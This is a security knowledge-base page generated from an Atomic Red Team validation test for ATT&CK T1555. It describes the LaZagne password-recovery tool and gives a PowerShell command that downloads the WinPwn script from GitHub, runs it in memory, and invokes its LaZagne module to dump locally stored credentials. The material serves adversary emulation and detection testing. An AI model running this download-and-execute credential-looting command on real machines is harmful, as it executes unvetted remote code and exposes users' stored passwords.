---
atomic_guid: "079ee2e9-6f16-47ca-a635-14efcd994118"
title: "WinPwn - Loot local Credentials - lazagne"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555"
attack_technique_name: "Credentials from Password Stores"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "079ee2e9-6f16-47ca-a635-14efcd994118"
  - "WinPwn - Loot local Credentials - lazagne"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. 
Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). 
This tool has been developed for the purpose of finding these passwords for the most commonly-used software

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555: Credentials from Password Stores]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
lazagnemodule -consoleoutput -noninteractive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555/T1555.yaml)
